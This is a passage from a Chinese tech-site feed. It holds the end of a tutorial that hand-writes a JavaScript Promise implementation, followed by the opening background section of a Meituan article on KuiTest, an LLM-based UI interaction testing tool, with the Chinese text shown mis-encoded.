            } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">promiseState</span> === <span class="hljs-string">'rejected'</span>) {
                <span class="hljs-title function_">handleRejected</span>();
            } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">promiseState</span> === <span class="hljs-string">'pending'</span>) {
                <span class="hljs-comment">// å¦‚æœæ˜¯pendingçŠ¶æ€ï¼Œå°†å›è°ƒå‡½æ•°å­˜å‚¨èµ·æ¥</span>
                <span class="hljs-variable language_">this</span>.<span class="hljs-property">onResolvedCallbacks</span>.<span class="hljs-title function_">push</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">handleResolved</span>());
                <span class="hljs-variable language_">this</span>.<span class="hljs-property">onRejectedCallbacks</span>.<span class="hljs-title function_">push</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">handleRejected</span>());
            }
        });

        <span class="hljs-keyword">return</span> promise2;
    }

    <span class="hljs-comment">// å¤„ç†Promiseè§£æè¿‡ç¨‹</span>
    <span class="hljs-title function_">resolvePromise</span>(<span class="hljs-params">promise2, x, resolve, reject</span>) {
        <span class="hljs-comment">// é˜²æ­¢å¾ªç¯å¼•ç”¨</span>
        <span class="hljs-keyword">if</span> (promise2 === x) {
            <span class="hljs-keyword">return</span> <span class="hljs-title function_">reject</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">TypeError</span>(<span class="hljs-string">'Chaining cycle detected for promise'</span>));
        }

        <span class="hljs-comment">// æ ‡è®°æ˜¯å¦å·²è¢«è°ƒç”¨ï¼Œé˜²æ­¢å¤šæ¬¡è°ƒç”¨</span>
        <span class="hljs-keyword">let</span> called = <span class="hljs-literal">false</span>;

        <span class="hljs-keyword">if</span> (x !== <span class="hljs-literal">null</span> &amp;&amp; (<span class="hljs-keyword">typeof</span> x === <span class="hljs-string">'object'</span> || <span class="hljs-keyword">typeof</span> x === <span class="hljs-string">'function'</span>)) {
            <span class="hljs-keyword">try</span> {
                <span class="hljs-comment">// è·å–thenæ–¹æ³•</span>
                <span class="hljs-keyword">const</span> then = x.<span class="hljs-property">then</span>;

                <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> then === <span class="hljs-string">'function'</span>) {
                    <span class="hljs-comment">// å¦‚æœxæœ‰thenæ–¹æ³•ï¼Œåˆ™å°†å…¶è§†ä¸ºPromise</span>
                    then.<span class="hljs-title function_">call</span>(
                        x,
                        <span class="hljs-comment">// resolvePromise</span>
                        <span class="hljs-function"><span class="hljs-params">y</span> =&gt;</span> {
                            <span class="hljs-keyword">if</span> (called) <span class="hljs-keyword">return</span>;
                            called = <span class="hljs-literal">true</span>;
                            <span class="hljs-comment">// é€’å½’è§£æ</span>
                            <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">resolvePromise</span>(promise2, y, resolve, reject);
                        },
                        <span class="hljs-comment">// rejectPromise</span>
                        <span class="hljs-function"><span class="hljs-params">r</span> =&gt;</span> {
                            <span class="hljs-keyword">if</span> (called) <span class="hljs-keyword">return</span>;
                            called = <span class="hljs-literal">true</span>;
                            <span class="hljs-title function_">reject</span>(r);
                        }
                    );
                } <span class="hljs-keyword">else</span> {
                    <span class="hljs-comment">// å¦‚æœxæ˜¯æ™®é€šå¯¹è±¡æˆ–å‡½æ•°ï¼Œç›´æ¥resolve</span>
                    <span class="hljs-title function_">resolve</span>(x);
                }
            } <span class="hljs-keyword">catch</span> (error) {
                <span class="hljs-keyword">if</span> (called) <span class="hljs-keyword">return</span>;
                called = <span class="hljs-literal">true</span>;
                <span class="hljs-title function_">reject</span>(error);
            }
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-comment">// å¦‚æœxæ˜¯åŸºæœ¬ç±»å‹ï¼Œç›´æ¥resolve</span>
            <span class="hljs-title function_">resolve</span>(x);
        }
    }

    <span class="hljs-comment">// catchæ–¹æ³•æ¥æ”¶ä¸€ä¸ªå‚æ•°onRejected</span>
    <span class="hljs-keyword">catch</span>(onRejected) {
        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">then</span>(<span class="hljs-literal">null</span>, onRejected);
    }

    <span class="hljs-comment">// finallyæ–¹æ³•æ¥æ”¶ä¸€ä¸ªå‚æ•°onFinally</span>
    <span class="hljs-title function_">finally</span>(<span class="hljs-params">onFinally</span>) {
        <span class="hljs-comment">// éœ€è¦å…ˆæ£€æŸ¥ onFinally æ˜¯å¦ä¸ºå‡½æ•°</span>
        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> onFinally !== <span class="hljs-string">'function'</span>) {
            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">then</span>();
        }
        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">then</span>(
            <span class="hljs-function"><span class="hljs-params">value</span> =&gt;</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>(<span class="hljs-title function_">onFinally</span>()).<span class="hljs-title function_">then</span>(<span class="hljs-function">() =&gt;</span> value),
            <span class="hljs-function"><span class="hljs-params">reason</span> =&gt;</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>(<span class="hljs-title function_">onFinally</span>()).<span class="hljs-title function_">then</span>(<span class="hljs-function">() =&gt;</span> { <span class="hljs-keyword">throw</span> reason })
        );
    }

    <span class="hljs-comment">// Promiseé™æ€æ–¹æ³•resolve</span>
    <span class="hljs-keyword">static</span> <span class="hljs-title function_">resolve</span>(<span class="hljs-params">value</span>) {
        <span class="hljs-comment">// å¦‚æœå·²ç»æ˜¯Promiseå®ä¾‹ï¼Œç›´æ¥è¿”å›</span>
        <span class="hljs-keyword">if</span> (value <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Promise</span>) {
            <span class="hljs-keyword">return</span> value;
        }

        <span class="hljs-comment">// æ™®é€šå€¼</span>
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function"><span class="hljs-params">resolve</span> =&gt;</span> {
            <span class="hljs-title function_">resolve</span>(value);
        });
    }

    <span class="hljs-comment">// Promiseé™æ€æ–¹æ³•reject</span>
    <span class="hljs-keyword">static</span> <span class="hljs-title function_">reject</span>(<span class="hljs-params">reason</span>) {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">_, reject</span>) =&gt;</span> {
            <span class="hljs-title function_">reject</span>(reason);
        });
    }

    <span class="hljs-comment">// Promiseé™æ€æ–¹æ³•all</span>
    <span class="hljs-keyword">static</span> <span class="hljs-title function_">all</span>(<span class="hljs-params">promises</span>) {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> {
            <span class="hljs-keyword">if</span> (!<span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>(promises) || promises.<span class="hljs-property">length</span> === <span class="hljs-number">0</span>) {
                <span class="hljs-keyword">return</span> <span class="hljs-title function_">reject</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">TypeError</span>(<span class="hljs-string">'å‚æ•°å¿…é¡»æ˜¯æ•°ç»„'</span>));
            }

            <span class="hljs-keyword">const</span> results = [];
            <span class="hljs-keyword">let</span> completedCount = <span class="hljs-number">0</span>;

            promises.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">promise, index</span>) =&gt;</span> {
                <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>(promise).<span class="hljs-title function_">then</span>(
                    <span class="hljs-function"><span class="hljs-params">value</span> =&gt;</span> {
                        results[index] = value;
                        completedCount++;

                        <span class="hljs-keyword">if</span> (completedCount === promises.<span class="hljs-property">length</span>) {
                            <span class="hljs-title function_">resolve</span>(results);
                        }
                    },
                    reject  <span class="hljs-comment">// ç›´æ¥ä¼ é€’rejectå‡½æ•°</span>
                );
            });
        });
    }

    <span class="hljs-comment">// Promiseé™æ€æ–¹æ³•race</span>
    <span class="hljs-keyword">static</span> <span class="hljs-title function_">race</span>(<span class="hljs-params">promises</span>) {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> {
            <span class="hljs-keyword">if</span> (!<span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>(promises) || promises.<span class="hljs-property">length</span> === <span class="hljs-number">0</span>) {
                <span class="hljs-keyword">return</span> <span class="hljs-title function_">reject</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">TypeError</span>(<span class="hljs-string">'å‚æ•°å¿…é¡»æ˜¯æ•°ç»„'</span>));
            }

            promises.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">promise</span> =&gt;</span> {
                <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>(promise).<span class="hljs-title function_">then</span>(resolve, reject);
            });
        });
    }

    <span class="hljs-comment">// Promiseé™æ€æ–¹æ³•allSettled</span>
    <span class="hljs-keyword">static</span> <span class="hljs-title function_">allSettled</span>(<span class="hljs-params">promises</span>) {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> {
            <span class="hljs-keyword">if</span> (!<span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>(promises) || promises.<span class="hljs-property">length</span> === <span class="hljs-number">0</span>) {
                <span class="hljs-keyword">return</span> <span class="hljs-title function_">reject</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">TypeError</span>(<span class="hljs-string">'å‚æ•°å¿…é¡»æ˜¯æ•°ç»„'</span>));
            }

            <span class="hljs-keyword">const</span> results = [];
            <span class="hljs-keyword">let</span> completedCount = <span class="hljs-number">0</span>;

            <span class="hljs-keyword">const</span> <span class="hljs-title function_">processResult</span> = (<span class="hljs-params">index, value, status</span>) =&gt; {
                results[index] = status === <span class="hljs-string">'fulfilled'</span>
                    ? { <span class="hljs-attr">status</span>: <span class="hljs-string">'fulfilled'</span>, value }
                    : { <span class="hljs-attr">status</span>: <span class="hljs-string">'rejected'</span>, <span class="hljs-attr">reason</span>: value };

                completedCount++;

                <span class="hljs-keyword">if</span> (completedCount === promises.<span class="hljs-property">length</span>) {
                    <span class="hljs-title function_">resolve</span>(results);
                }
            };

            promises.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">promise, index</span>) =&gt;</span> {
                <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>(promise).<span class="hljs-title function_">then</span>(
                    <span class="hljs-function"><span class="hljs-params">value</span> =&gt;</span> <span class="hljs-title function_">processResult</span>(index, value, <span class="hljs-string">'fulfilled'</span>),
                    <span class="hljs-function"><span class="hljs-params">reason</span> =&gt;</span> <span class="hljs-title function_">processResult</span>(index, reason, <span class="hljs-string">'rejected'</span>)
                );
            });
        });
    }


    <span class="hljs-comment">// Promiseé™æ€æ–¹æ³•any</span>
    <span class="hljs-keyword">static</span> <span class="hljs-title function_">any</span>(<span class="hljs-params">promises</span>) {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> {
            <span class="hljs-keyword">if</span> (!<span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>(promises) || promises.<span class="hljs-property">length</span> === <span class="hljs-number">0</span>) {
                <span class="hljs-keyword">return</span> <span class="hljs-title function_">reject</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">TypeError</span>(<span class="hljs-string">'å‚æ•°å¿…é¡»æ˜¯æ•°ç»„'</span>));
            }

            <span class="hljs-keyword">const</span> errors = [];
            <span class="hljs-keyword">let</span> rejectedCount = <span class="hljs-number">0</span>;

            promises.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">promise, index</span>) =&gt;</span> {
                <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>(promise).<span class="hljs-title function_">then</span>(
                    <span class="hljs-function"><span class="hljs-params">value</span> =&gt;</span> {
                        <span class="hljs-title function_">resolve</span>(value);
                    },
                    <span class="hljs-function"><span class="hljs-params">reason</span> =&gt;</span> {
                        errors[index] = reason;
                        rejectedCount++;
                        <span class="hljs-keyword">if</span> (rejectedCount === promises.<span class="hljs-property">length</span>) {
                            <span class="hljs-title function_">reject</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">AggregateError</span>(errors, <span class="hljs-string">'æ‰€æœ‰Promiseéƒ½è¢«æ‹’ç»'</span>));
                        }
                    }
                );
            });
        });
    }
}

</code></pre>
<h2 data-id="heading-30">ç»“è¯­</h2>
<p>æœ¬æ–‡é€šè¿‡æ‰‹å†™å®ç°Promiseï¼Œæ·±å…¥ç†è§£äº†Promiseçš„å·¥ä½œåŸç†ï¼ŒæŒæ¡äº†å¼‚æ­¥ç¼–ç¨‹çš„æ ¸å¿ƒæ€æƒ³ã€‚è™½ç„¶å®é™…çš„Promiseå®ç°æ›´ä¸ºå¤æ‚ï¼ˆè€ƒè™‘æ›´å¤šè¾¹ç•Œæƒ…å†µå’Œæ€§èƒ½ä¼˜åŒ–ï¼‰ï¼Œä½†æœ¬æ–‡çš„å®ç°å·²ç»æ¶µç›–äº†Promiseçš„æ ¸å¿ƒåŠŸèƒ½ã€‚å¯¹äºæ–‡ç« ä¸­é”™è¯¯çš„åœ°æ–¹æˆ–è€…æœ‰ä»»ä½•é—®é¢˜ï¼Œæ¬¢è¿åœ¨è¯„è®ºåŒºç•™è¨€è®¨è®ºï¼</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[KuiTestï¼šåŸºäºå¤§æ¨¡å‹é€šè¯†çš„UIäº¤äº’éå†æµ‹è¯•]]></title>    <link>https://juejin.cn/post/7594398051721478182</link>    <guid>https://juejin.cn/post/7594398051721478182</guid>    <pubDate>2026-01-13T02:26:01.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594398051721478182" data-draft-id="7594398051721429030" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="KuiTestï¼šåŸºäºå¤§æ¨¡å‹é€šè¯†çš„UIäº¤äº’éå†æµ‹è¯•"/> <meta itemprop="keywords" content="äººå·¥æ™ºèƒ½"/> <meta itemprop="datePublished" content="2026-01-13T02:26:01.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç¾å›¢æŠ€æœ¯å›¢é˜Ÿ"/> <meta itemprop="url" content="https://juejin.cn/user/3509296845313741"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            KuiTestï¼šåŸºäºå¤§æ¨¡å‹é€šè¯†çš„UIäº¤äº’éå†æµ‹è¯•
            <!----> <!----></h1> <div class="container team-follow" data-v-d326b38e="" data-v-61fb5e44=""><div class="left" data-v-d326b38e=""><a href="/team/6930512966122995712/posts" data-v-d326b38e=""><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/47ccb42d726640a7889ba1e64ae203e6~tplv-k3u1fbpfcp-watermark.image" class="icon" data-v-d326b38e=""/></a> <div class="content" data-v-d326b38e=""><div style="display: flex" data-v-d326b38e=""><a href="/team/6930512966122995712/posts" data-v-d326b38e=""><p class="title-line" data-v-d326b38e=""><span title="ç¾å›¢æŠ€æœ¯å›¢é˜Ÿ" class="title" data-v-d326b38e="">ç¾å›¢æŠ€æœ¯å›¢é˜Ÿ</span> <img src="//lf-web-assets.juejin.cn/obj/juejin-web/xitu_juejin_web/255e400027b783cbad76dc41527e7695.svg" alt="team icon" class="team-icon" data-v-d326b38e=""/></p></a></div> <div class="meta-box team" data-v-d326b38e="" data-v-61fb5e44=""><time datetime="2026-01-13T02:26:01.000Z" title="Tue Jan 13 2026 02:26:01 GMT+0000 (Coordinated Universal Time)" class="time" data-v-d326b38e="" data-v-61fb5e44="">
                2026-01-13
              </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-d326b38e="" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-d326b38e="" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-d326b38e="" data-v-61fb5e44=""/></svg> <span class="views-count" style="display:none;" data-v-d326b38e="" data-v-61fb5e44="">
                0
              </span> <span class="read-time" data-v-d326b38e="" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-d326b38e="" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-d326b38e="" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-d326b38e="" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-d326b38e="" data-v-61fb5e44=""/></svg>
                é˜…è¯»16åˆ†é’Ÿ
              </span> <!----> <!----></div></div></div> <button class="jj-follow-button follow-btn" style="display:none;" data-v-b60b2868="" data-v-d326b38e=""><span data-v-b60b2868="" data-v-d326b38e=""><i class="byte-icon byte-icon--plus" data-v-d326b38e=""><svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 48 48"><path fill="none" d="M0 0h48v48H0z"/><path d="M24.7 4c.4 0 .6 0 .8.1.2.1.3.2.4.4.1.2.1.3.1.8V22h16.7c.4 0 .6 0 .8.1.2.1.3.2.4.4.1.2.1.3.1.8v1.4c0 .4 0 .6-.1.8-.1.2-.2.3-.4.4-.2.1-.3.1-.8.1H26v16.7c0 .4 0 .6-.1.8-.1.2-.2.3-.4.4-.2.1-.3.1-.8.1h-1.4c-.4 0-.6 0-.8-.1-.2-.1-.3-.2-.4-.4-.1-.2-.1-.3-.1-.8V26H5.3c-.4 0-.6 0-.8-.1-.2-.1-.3-.2-.4-.4-.1-.2-.1-.3-.1-.8v-1.4c0-.4 0-.6.1-.8.1-.2.2-.3.4-.4.2-.1.3-.1.8-.1H22V5.3c0-.4 0-.6.1-.8.1-.2.2-.3.4-.4.2-.1.3-.1.8-.1h1.4z"/></svg></i>
        å…³æ³¨
      </span></button></div> <div class="team-user block-hidden" data-v-61fb5e44=""><div class="avatar jj-avatar avatar" data-v-03256cc6="" data-v-61fb5e44=""><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADwAAAA8AQMAAAAAMksxAAAAA1BMVEUAAACnej3aAAAAAXRSTlMAQObYZgAAAA5JREFUKM9jGAWjAAcAAAIcAAE27nY6AAAAAElFTkSuQmCC" alt="avatar" class="lazy avatar-img" data-v-5244ef91="" data-v-03256cc6=""/> </div> <!----> <span class="position ellipsis" data-v-61fb5e44="">
              ç¾å›¢å°ç¼– @ç¾å›¢
            </span></div> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>ç¾å›¢è´¨æ•ˆæŠ€æœ¯éƒ¨è”åˆå¤æ—¦å¤§å­¦å‘¨æ‰¬å¸†æ•™æˆå›¢é˜Ÿæ¨å‡ºKuiTestâ€”â€”é›¶è§„åˆ™UIåŠŸèƒ½æ€§å¼‚å¸¸æµ‹è¯•å·¥å…·ã€‚KuiTesté€šè¿‡å°†â€œäººç±»é¢„æœŸâ€ç›´æ¥ç”¨ä½œTest Oracleï¼Œè§£å†³äº†é•¿æœŸä»¥æ¥UIæµ‹è¯•Oracleæ³›åŒ–æ€§å·®çš„è‡ªåŠ¨åŒ–ç—›ç‚¹ã€‚å®éªŒè¡¨æ˜ï¼ŒKuiTestå¼‚å¸¸å¬å›ç‡è¾¾86%ï¼Œè¯¯æŠ¥ç‡ä»…1.2%ï¼Œå·²åœ¨æ‰§è¡Œ21ä¸‡+æµ‹è¯•ç”¨ä¾‹ï¼Œå‘ç°ç™¾ä½™ä¾‹æœ‰æ•ˆç¼ºé™·ï¼Œå¤§å¹…é™ä½äººå·¥æˆæœ¬å¹¶æå‡æµ‹è¯•è¦†ç›–ç‡ã€‚</p>
</blockquote>
<h2 data-id="heading-0">1 èƒŒæ™¯</h2>
<p>è¿‘æ¥ï¼Œéšç€ App çš„åŠŸèƒ½æ„ˆå‘å¤æ‚ï¼ŒUIï¼ˆç”¨æˆ·ç•Œé¢ï¼‰çš„äº¤äº’é€»è¾‘ä¹Ÿéšä¹‹å¤šæ ·åŒ–ã€‚ä¸ºäº†ä¿éšœç”¨æˆ·ä½“éªŒï¼Œé’ˆå¯¹ UI çš„åŠŸèƒ½æµ‹è¯•ä¸€ç›´æ˜¯è´¨é‡ä¿éšœä¸­çš„é‡è¦ç¯èŠ‚ã€‚ä¼ ç»Ÿçš„ UI åŠŸèƒ½æµ‹è¯•å¾€å¾€ä¾èµ–äºäººå·¥ç¼–å†™çš„æµ‹è¯•è„šæœ¬æˆ–è§„åˆ™ä½“ç³»ï¼šé€šè¿‡æ‰‹åŠ¨ç¼–å†™æ ¡éªŒé€»è¾‘æ¥éªŒè¯äº¤äº’æ˜¯å¦æ­£ç¡®ã€‚è¿™ç§æ–¹å¼è™½ç„¶ç²¾ç¡®ï¼Œä½†æˆæœ¬é«˜æ˜‚ï¼Œç»´æŠ¤å›°éš¾ã€‚</p>
<p>å¯¹ç¾å›¢è€Œè¨€ï¼Œ ä¸€ä¸ª App å°±æœ‰å¯èƒ½åŒ…å«ä¸Šåƒç§ UI ç•Œé¢ã€æ•°ä¸‡ä¸ªäº¤äº’æ“ä½œã€‚éšç€ä¸šåŠ¡å¿«é€Ÿè¿­ä»£ã€ç•Œé¢é¢‘ç¹è°ƒæ•´ã€åº•å±‚å¹³å°ï¼ˆå¦‚ Androidã€iOSã€HarmonyOS NEXTï¼‰çš„æ›´æ–°ï¼ŒåŸºäºè§„åˆ™çš„æµ‹è¯•è„šæœ¬å¸¸å¸¸å¤±æ•ˆã€‚æ¯å½“è„šæœ¬å¤±æ•ˆï¼Œæµ‹è¯•å·¥ç¨‹å¸ˆéƒ½éœ€è¦èŠ±è´¹å¤§é‡æ—¶é—´é‡æ–°ç»‘å®šå…ƒç´ ã€ä¿®å¤è§„åˆ™è„šæœ¬ï¼Œæå¤§åœ°æå‡äº†æµ‹è¯•è‡ªåŠ¨åŒ–çš„å¼€é”€ã€‚æ­¤å¤–ï¼Œå½“ä¸‹çš„ UI åŠŸèƒ½ç¼ºé™·é€šå¸¸å¹¶ä¸è¡¨ç°ä¸ºå´©æºƒï¼Œè€Œæ˜¯æ›´å¤æ‚çš„å“åº”é€»è¾‘å¼‚å¸¸ï¼šä¾‹å¦‚å›¾ 1 ä¸­ç‚¹å‡»â€œå…¨éƒ¨å·²è¯»â€å´æ¸…ç©ºäº†æ¶ˆæ¯åˆ—è¡¨ç­‰ã€‚è¿™ç±»é—®é¢˜ä¸¥é‡å½±å“ç”¨æˆ·ä½“éªŒï¼Œä½†éš¾ä»¥é€šè¿‡ç®€å•è§„åˆ™æ¦‚æ‹¬ï¼Œé™åˆ¶äº†ä¼ ç»Ÿ UI æµ‹è¯•è‡ªåŠ¨åŒ–çš„è¦†ç›–ç‡ä¸æ•ˆç‡ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2b23ed847322437083a1b5b0984ce3ad~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg576O5Zui5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768875960&amp;x-signature=M8ThfQEeq7MkG6rDf9HIGR0UwLo%3D" alt="å›¾ 1 - UI åŠŸèƒ½å“åº”å¼‚å¸¸ç¤ºä¾‹" loading="lazy"/></p>
